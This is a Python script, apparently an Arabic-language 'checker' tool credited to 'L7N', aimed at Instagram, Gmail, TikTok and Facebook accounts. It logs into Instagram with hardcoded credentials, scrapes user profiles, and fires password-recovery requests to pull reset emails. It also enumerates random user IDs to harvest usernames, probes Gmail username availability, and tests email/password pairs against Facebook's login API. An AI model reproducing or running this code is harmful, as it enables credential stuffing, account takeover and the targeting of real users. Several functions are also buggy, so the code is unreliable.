import requests
import time
from user_agent import generate_user_agent
from hashlib import md5
from random import randrange
from threading import Thread
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
from requests import post
import random
def info_instagram(user):
    	time_now = int(time.time())
    	csrftoken_url = 'https://i.instagram.com/api/v1/public/landing_info/'
    	csrftoken_headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/105 Version/11.1.1 Safari/605.1.15',
        'X-IG-App-ID': '936619743392459',
    }
    	session = requests.Session()
    	csrftoken_r = session.get(csrftoken_url, headers=csrftoken_headers)
    	cookies = csrftoken_r.cookies.get_dict()
    	mid = cookies['mid']
    	ig_did = cookies['ig_did']
    	csrftoken = cookies['csrftoken']
    	headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
        'X-IG-App-ID': '936619743392459',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': f'csrftoken={csrftoken}; ig_did={ig_did}; ig_nrcb=1; mid={mid}',
        'X-CSRFToken': f'{csrftoken}',
    }
    	username = "g_4_q"
    	password = "L7NL7NL7N"
    	url_login = 'https://www.instagram.com/accounts/login/ajax/'
    	data = f'enc_password=#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}&username={username}&queryParams=%7B%7D&optIntoOneTap=false&stopDeletionNonce=&trustedDeviceRecords=%7B%7D'
    	login = session.post(url_login, headers=headers, data=data)
    	with open('cookies.txt', 'w') as f:
    	       for cookie in session.cookies:
    	       	f.write(f"{cookie.name}={cookie.value}; ")
    	       	headers2 = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    	       	data2 = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
}
    	       	api_url = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}';req = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers2,data=data2,)
    	       	api_headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
        'X-IG-App-ID': '936619743392459',
        'Cookie': f'csrftoken={csrftoken}; ig_did={ig_did}; mid={mid}',
    }
    	       	response = session.get(api_url, headers=api_headers)
    	       	rr = response.json()
    	       	try:
    	       		Id =rr['data']['user']['id']
    	       	except:
    	       		Id=''
    	       	try:
    	       		name=rr['data']['user']['full_name']
    	       	except:
    	       		name =''
    	       	try:
    	       		bio =rr['data']['user']['biography']
    	       	except:
    	       		bio =''
    	       	try:
    	       		flos =rr['data']['user']['edge_followed_by']['count']
    	       	except:
    	       		fols=''
    	       	try:
    	       		flog =rr['data']['user']['edge_follow']['count']
    	       	except:
    	       		flog=''
    	       	try:
    	       		pr=rr['data']['user']['is_private']
    	       	except:
    	       		pr=0
    	       	try:
    	       		verifide=rr['data']['user']['is_verified'];business=rr['data']['user']['business_email']
    	       	except:
    	       		verifide=''
    	       	try:
    	       		re = requests.get(f"https://o7aa.pythonanywhere.com/?id={Id}").json()
    	       		da = re['date']
    	       	except:
    	       		da=''
    	       	try:
                    rest = req.json()['email']
    	       	except:
                    rest = ""
    	       	info_get = {"user":user,"name":name,"id":Id,"private":pr,"date":da,"following":flog,"followers":flos,"bio":bio,"reset":rest,"verifide":verifide,"business_email":business,"Programmer": "𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™"}
    	       	return info_get

def info_tiktok(user):
	     	try:
	     		url = 'http://tik.report.ilebo.cc/users/login'
	     		headers = {
            'X-IG-Capabilities': '3brTvw==',
            'User-Agent': 'TikTok 85.0.0.21.100 Android (33/13; 480dpidpi; 1080x2298; HONOR; ANY-LX2; ANY-LX2;)',
            'Accept-Language': 'en-US',
            'Content-Type': 'application/json; charset=utf-8',
            'Content-Length': '73',
            'Host': 'tik.report.ilebo.cc',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
        }
	     		data = {"unique_id": user, "purchaseTokens": []}
		     	respose = requests.post(url, headers=headers, data=data).json()
		     	name = respose['data']['user']['user']['nickname']
		     	following= respose['data']['user']['stats']['followingCount']
		     	followers = respose['data']['user']['stats']['followerCount']
		     	Id = respose['data']['user']['user']['id']
		     	like = respose['data']['user']['stats']['heartCount']
		     	private = respose['data']['user']['user']['privateAccount']
		     	video = respose['data']['user']['stats']['videoCount']
		     	info_get = {'name':name,'followers':followers,'following':following,'id':Id,'like':like,'private':private,'video':video}
		     	return info_get
		#return good user
	     	except:
	     		return {'username':'','name':'','followers':'','following':'','id':'','like':'','video':''}

ids=[]
def get_id():
  id=str(randrange(1000000, 30000000000))
  if id not in ids:
    ids.append(id)
    return id
  else:
    get_id()
def get_username():
  from time import time
  while True:
    try:
      id=get_id()
      csrftoken = md5(str(time()).encode()).hexdigest()
      headers = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'dpr': '0.8',
    'origin': 'https://www.instagram.com',
    'user-agent': generate_user_agent(),
    'x-csrftoken': csrftoken,
    }
      data = {
    '__spin_b': 'trunk',
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
    'variables': '{"userID":"'+id+'","username":"0s9s"}',
    'server_timestamps': 'true',
    'doc_id': '7666785636679494',
}
      response = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data).json()
      username=response['data']['user']['username']
      if "_" in username:
      	""
      else:
      	if len(username) >= 6:
      		return username
      	else:
      		""
	
    except:
      ""
  
def tll():
  yy='azertyuiopmlkjhgfdsqwxcvbn'
  try:
    n1=''.join(cc(yy)for i in range(rr(6,9)))
    n2=''.join(cc(yy)for i in range(rr(3,9)))
    host=''.join(cc(yy)for i in range(rr(15,30)))
    cookies = {
      '__Host-GAPS': host,
  }
    headers = {
      'authority': 'accounts.google.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'google-accounts-xsrf': '1',
      'origin': 'https://accounts.google.com',
      'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
      'user-agent': gg(),
  }
    data = {
    'f.req': '["AEThLlz4luDk2yFWsQRU_KlZsoYtu6wNeZxocOIcj1BG20WA078YKjPYBHlgL8qq82PZDts7UWS0jQ2QmOU-Fh9UrfhgvRXgjlgxmWn2VptjYAi-emfCuzIezrd4IbKkWLbdSPxnA_mTSmtNVuiqJU_VZfR-KE3MtZf8qft2oqLdafTBloXqbn65aQv_o_DuwIR7pG6MmB_g","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
  }
    response = pp(
      'https://accounts.google.com/_/signup/validatepersonaldetails',
      cookies=cookies,
      headers=headers,
      data=data,
  )
    tl=str(response.text).split('",null,"')[1].split('"')[0]
    host=response.cookies.get_dict()['__Host-GAPS']
    return tl,host
  except Exception as e:
    tll()
def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    tl,host=tll()
    cookies = {
    '__Host-GAPS': host
  }
    headers = {
    'authority': 'accounts.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'google-accounts-xsrf': '1',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
    'user-agent': gg(),
  }
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
    if '"gf.uar",1' in str(response.text):return {"status": "good","email": email}
    else:return {"status": "bad","email": email}
  except:check_gmail(email)

def rest_inata(user):
	mj=0
	url='https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
	h={
 'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
 'X-Pigeon-Rawclienttime':'1707104597.347',
 'X-IG-Connection-Speed':'-1kbps',
 'X-IG-Bandwidth-Speed-KBPS':'-1.000',
 'X-IG-Bandwidth-TotalBytes-B':'0',
 'X-IG-Bandwidth-TotalTime-MS':'0',
 'X-IG-VP9-Capable':'false',
 'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
 'X-IG-Connection-Type':'WIFI',
 'X-IG-Capabilities':'3brTvw==',
 'X-IG-App-ID':'567067343352427',
 'User-Agent':'Instagram 100.0.0.17.129 Android (30/11; 320dpi; 720x1448; realme; RMX3231; RMX3231; RMX3231; ar_IQ; 161478664)',
 'Accept-Language':'ar-IQ, en-US',
 'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
 'Accept-Encoding':'gzip, deflate',
 'Host':'i.instagram.com',
 'X-FB-HTTP-Engine':'Liger',
 'Connection':'keep-alive',
 'Content-Length':'364',
 }
	da={
 'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{user}''"}',
 
 'ig_sig_key_version':'4',
 }
	L7n=post(url,headers=h,data=da).text
	if '"تم إرسال البريد الإلكتروني"' in L7n:
		L7n = L7n.split('email":"')[1].split('","status":"ok"}')[0]
		return {"reset": L7n}
	else:
		return {"reset": L7n}

def check_face(user,password):
	data ={"locale": "en_GB","format": "json","email": user,"password": password,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies": 1}
	head = {'user-agent': str(generate_user_agent()),'Host':'graph.facebook.com','Content-Type':'application/json;charset=utf-8','Content-Length':'595','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
	res = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
	if 'session_key' in res:
	   return {"OK"}
	elif 'www.facebook.com' in res['error']['message']:
	   return {"CP"}
	else:
		return {"ERORR"}
def check_insta(email):
    with requests.Session() as session:
        url = session.get('https://www.instagram.com/api/v1/web/accounts/login/ajax/')
        mmmkk = session.cookies.get_dict()
        csr = str(mmmkk.get('csrftoken', ''))
        dip = str(mmmkk.get('mid', ''))
        gg = str(mmmkk.get('ig_did', ''))

    ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
    port = random.choice(pl)
    proxy = ip + ":" + str(port)

    cookies = {
        'csrftoken': csr,
        'ps_n': '0',
        'ps_l': '0',
        'mid': dip,
        'ig_did': gg,
        'ig_nrcb': '1',
    }

    headers = {
        'authority': 'www.instagram.com',
        'accept': '*/*',
        'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
        'content-type': 'application/x-www-form-urlencoded',
        'dpr': '2.19889',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
        'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Linux"',
        'sec-ch-ua-platform-version': '""',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': str(generate_user_agent()),
        'viewport-width': '891',
        'x-asbd-id': '129477',
        'x-csrftoken': csr,
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-instagram-ajax': '1012280089',
        'x-requested-with': 'XMLHttpRequest',
    }

    timestamp = str(time.time()).split('.')[0]

    data = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:mahos999',
        'optIntoOneTap': 'false',
        'queryParams': '{}',
        'trustedDeviceRecords': '{}',
        'username': email,
    }

    rr = session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data, proxies={'http': proxy}).text
    if '"user":true,"' in rr:
        return {"status": "good"}
    else:
        return {"status": "bad"}

#L7N                